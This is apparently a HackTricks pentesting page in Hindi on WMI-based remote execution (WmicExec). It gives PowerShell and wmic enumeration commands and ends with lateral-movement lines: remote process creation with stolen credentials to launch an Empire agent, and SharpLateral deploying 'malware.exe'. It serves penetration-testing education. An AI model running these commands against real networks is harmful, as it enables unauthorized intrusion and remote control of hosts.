# WmicExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricks repo** में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## यह कैसे काम करता है

Wmi उन होस्ट्स में प्रोसेस खोलने की अनुमति देता है जहाँ आप उपयोगकर्ता नाम/(पासवर्ड/हैश) जानते हैं। फिर, Wmiexec wmi का उपयोग करके प्रत्येक कमांड को निष्पादित करता है जिसे निष्पादित करने के लिए कहा जाता है (इसीलिए Wmicexec आपको अर्ध-इंटरैक्टिव शेल प्रदान करता है)।

**dcomexec.py:** यह स्क्रिप्ट wmiexec.py के समान एक अर्ध-इंटरैक्टिव शेल प्रदान करती है, लेकिन विभिन्न DCOM एंडपॉइंट्स (ShellBrowserWindow DCOM ऑब्जेक्ट) का उपयोग करती है। वर्तमान में, यह MMC20 का समर्थन करता है। एप्लिकेशन, शेल विंडोज और शेल ब्राउज़र विंडो ऑब्जेक्ट्स। (यहाँ से [here](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMI मूल बातें

### Namespace

WMI एक निर्देशिका-शैली की पदानुक्रम में विभाजित है, \root कंटेनर के साथ \root के नीचे अन्य निर्देशिकाएँ। इन "निर्देशिका पथों" को नामस्थान कहा जाता है।\
नामस्थान सूचीबद्ध करें:
```bash
#Get Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

#List all namespaces (you may need administrator to list all of them)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

#List namespaces inside "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
नेमस्पेस की क्लासेस की सूची इसके साथ:
```bash
gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **कक्षाएं**

WMI कक्षा का नाम जैसे: win32\_process किसी भी WMI क्रिया के लिए एक प्रारंभिक बिंदु है। हमें हमेशा एक कक्षा का नाम और नामस्थान जहां यह स्थित है, जानना आवश्यक है।\
`win32` से शुरू होने वाली कक्षाओं की सूची:
```bash
Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
क्लास को कॉल करें:
```bash
#When you don't specify a namespaces by default is "root/cimv2"
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### तरीके

WMI कक्षाओं में एक या अधिक कार्य होते हैं जिन्हें निष्पादित किया जा सकता है। इन कार्यों को तरीके कहा जाता है।
```bash
#Load a class using [wmiclass], leist methods and call one
$c = [wmiclass]"win32_share"
$c.methods
#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
$c.Create("c:\share\path","name",0,$null,"My Description")
#If returned value is "0", then it was successfully executed
```

```bash
#List methods
Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
#Call create method from win32_share class
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI एन्यूमरेशन

### WMI सेवा की जाँच करें

यह आप WMI सेवा चल रही है या नहीं यह कैसे जाँच सकते हैं:
```bash
#Check if WMI service is running
Get-Service Winmgmt
Status   Name               DisplayName
------   ----               -----------
Running  Winmgmt            Windows Management Instrumentation

#From CMD
net start | findstr "Instrumentation"
```
### सिस्टम जानकारी
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
```
### प्रक्रिया की जानकारी
```bash
Get-WmiObject win32_process | Select Name, Processid
```
एक हमलावर के दृष्टिकोण से, WMI एक सिस्टम या डोमेन के बारे में संवेदनशील जानकारी की पहचान करने में बहुत मूल्यवान हो सकता है।
```
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

```bash
Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
```
## **मैनुअल रिमोट WMI क्वेरीइंग**

उदाहरण के लिए, यहाँ एक बहुत ही चुपके से तरीका है दूरस्थ मशीन पर स्थानीय एडमिन्स का पता लगाने के लिए (ध्यान दें कि domain यहाँ कंप्यूटर का नाम है):

{% code overflow="wrap" %}
```bash
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")
```
{% endcode %}

एक और उपयोगी ऑनलाइनर यह देखने के लिए है कि कौन मशीन पर लॉग इन है (जब आप एडमिन्स की तलाश कर रहे हों):
```bash
wmic /node:ordws01 path win32_loggedonuser get antecedent
```
`wmic` एक टेक्स्ट फाइल से नोड्स पढ़ सकता है और उन सभी पर कमांड निष्पादित कर सकता है। यदि आपके पास वर्कस्टेशन्स की एक टेक्स्ट फाइल है:
```
wmic /node:@workstations.txt path win32_loggedonuser get antecedent
```
**हम WMI के माध्यम से दूरस्थ रूप से एक प्रक्रिया बनाएंगे ताकि Empire एजेंट को निष्पादित किया जा सके:**
```bash
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"
```
हम देखते हैं कि यह सफलतापूर्वक निष्पादित हुआ (ReturnValue = 0)। और एक सेकंड बाद हमारा Empire listener इसे पकड़ लेता है। ध्यान दें कि प्रक्रिया ID वही है जो WMI ने लौटाई थी।

यह सभी जानकारी यहाँ से निकाली गई थी: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## स्वचालित उपकरण

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.**

</details>
